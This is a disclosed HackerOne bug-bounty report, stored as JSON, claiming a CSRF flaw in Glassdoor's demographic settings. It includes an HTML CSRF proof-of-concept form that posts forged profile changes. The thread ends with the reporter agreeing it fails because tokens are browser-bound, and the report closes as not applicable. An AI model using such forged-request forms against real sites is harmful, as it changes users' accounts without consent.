{"id":1092849,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDkyODQ5","url":"https://hackerone.com/reports/1092849","title":"CSRF in Demographic Settings with valid gdtoken of other account ","state":"Closed","substate":"not-applicable","severity_rating":"low","readable_substate":"N/A","created_at":"2021-02-02T13:11:22.321Z","submitted_at":"2021-02-02T13:11:22.339Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"turb0h4x","url":"/turb0h4x","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":204,"url":"https://hackerone.com/glassdoor","handle":"glassdoor","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/tenbgFGw2cedBhoeJciMDcYg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/tenbgFGw2cedBhoeJciMDcYg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Glassdoor","twitter_handle":"glassdoor","website":"http://www.glassdoor.com/","about":"Get Hired. Love Your Job."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-04-16T02:46:30.256Z","bug_reporter_agreed_on_going_public_at":"2021-02-02T21:07:08.764Z","team_member_agreed_on_going_public_at":"2021-04-16T02:46:30.150Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi Security Team,\nI found CSRF in account settings exactly in Demographic leads to change Brith Years and Gender .\n\nSteps To produce :\n\n1.Creat to 2 account \n* Attacker@mail.com\n* Victim@mail.com\n\n2. Login with attacker account and Go to Demographic settings i change gender and brith years \n3. Start burp and turn on intercept .\n4.Capture the request and send it to reapeter \n5. Generate CSRF POC : \n\n```\n\u003chtml\u003e\n  \u003c!-- CSRF PoC - generated by Burp Suite Professional --\u003e\n  \u003cbody\u003e\n  \u003cscript\u003ehistory.pushState('', '', '/')\u003c/script\u003e\n    \u003cform action=\"https://www.glassdoor.com/member/account/settings_changeUserInformation.htm\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"newGender\" value=\"FEMALE\" /\u003e\n      \u003cinput type=\"hidden\" name=\"birthYear\" value=\"1940\" /\u003e\n      \u003cinput type=\"hidden\" name=\"highestEducation\" value=\"HIGH\u0026#95;SCHOOL\" /\u003e\n      \u003cinput type=\"hidden\" name=\"gdToken\" value=\" Attcker token\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n* Host This html code .\n* Now , Login to victim account .\n* Click Submit, BrithYears and Gender will changed .\n\n## Impact\n\nChangin Demographic settings of users","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":3,"voters":["ali","sa1tama0","ekgaribadmi"],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":8181,"asset_type":"URL","asset_identifier":"http://www.glassdoor.com/","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10549759,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"automated_response":false,"created_at":"2021-02-02T13:13:25.023Z","updated_at":"2021-02-02T13:13:25.023Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":973902},"actor":{"username":"turb0h4x","cleared":false,"url":"/turb0h4x","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10550313,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"@turb0h4x - thanks for your report.\nDid you try the above html code on a different browser from the one the attacker used to generated the token?","automated_response":false,"created_at":"2021-02-02T14:19:38.194Z","updated_at":"2021-02-02T14:19:38.194Z","actor":{"username":"jjone","cleared":false,"url":"/jjone","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10550574,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @jjone ,\nYes i try it now in opera browser and the exploit is failed , i guesse exploit success in chrom browser .\n\nRegards,","automated_response":false,"created_at":"2021-02-02T14:47:20.991Z","updated_at":"2021-02-02T14:47:20.991Z","actor":{"username":"turb0h4x","cleared":false,"url":"/turb0h4x","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10554406,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Sir any update? ","automated_response":false,"created_at":"2021-02-02T19:14:15.757Z","updated_at":"2021-02-02T19:14:15.757Z","actor":{"username":"turb0h4x","cleared":false,"url":"/turb0h4x","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10554958,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @turb0h4x thanks for your response.\n\nOur CSRF token is designed to work in same browser as it was generated for approx 10 mins before it invalidates.\nThe CSRF token is tied to a gdId cookie which is user browser specific.\n\nSo in your case if you tried that HTML PoC in a chrome incognito window that shouldn't work. Or if you tried generated the CSRF token in firefox and tried it out in chrome that shouldn't work.\n\nLet me know if that's not the case. And if the behavior matches the above description feel free to self close!","automated_response":false,"created_at":"2021-02-02T19:51:36.391Z","updated_at":"2021-02-02T19:51:36.391Z","actor":{"username":"jjone","cleared":false,"url":"/jjone","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10555355,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @jjone ,\nYou Are right the exploit not work in other browser (Firefox, Opera).\nRegards,","automated_response":false,"created_at":"2021-02-02T20:32:15.251Z","updated_at":"2021-02-02T20:32:15.251Z","actor":{"username":"turb0h4x","cleared":false,"url":"/turb0h4x","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10555356,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"","automated_response":false,"created_at":"2021-02-02T20:32:26.799Z","updated_at":"2021-02-02T20:32:26.799Z","actor":{"username":"turb0h4x","cleared":false,"url":"/turb0h4x","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10555840,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-02-02T21:07:08.786Z","updated_at":"2021-02-02T21:07:08.786Z","first_to_agree":true,"actor":{"username":"turb0h4x","cleared":false,"url":"/turb0h4x","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11408805,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Sorry for the delay in getting back to your disclosure request.","automated_response":false,"created_at":"2021-04-16T02:46:30.167Z","updated_at":"2021-04-16T02:46:30.167Z","actor":{"username":"jjone","cleared":false,"url":"/jjone","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11408806,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-04-16T02:46:30.288Z","updated_at":"2021-04-16T02:46:30.288Z","actor":{"username":"jjone","cleared":false,"url":"/jjone","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"glassdoor","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}